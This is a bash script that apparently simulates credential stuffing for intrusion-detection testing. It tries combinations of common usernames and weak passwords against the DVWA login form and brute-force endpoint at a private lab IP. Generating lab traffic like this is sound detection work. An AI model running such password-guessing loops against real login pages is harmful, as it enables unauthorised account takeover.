#!/bin/bash
set -eu

RUN_ID="${1:-no-run-id}"
TARGET_IP="${TARGET_IP:-192.168.50.10}"

echo "[run_id=$RUN_ID] Credential stuffing simulation starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# Attack the DVWA login form directly — no prior session required
for user in admin administrator root test user guest dvwa; do
  for pass in admin password 123456 letmein qwerty passw0rd dvwa test; do
    curl -s -o /dev/null -m 4 \
      -X POST "http://$TARGET_IP/dvwa/login.php" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=$user&password=$pass&Login=Login" || true
  done
done

# Probe the DVWA brute-force module endpoint (unauthenticated — IDS still fires on payload)
curl -s -o /dev/null -m 4 \
  "http://$TARGET_IP/dvwa/vulnerabilities/brute/?username=admin&password=admin&Login=Login" || true
curl -s -o /dev/null -m 4 \
  "http://$TARGET_IP/dvwa/vulnerabilities/brute/?username=root&password=password&Login=Login" || true

echo "[run_id=$RUN_ID] Credential stuffing simulation done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
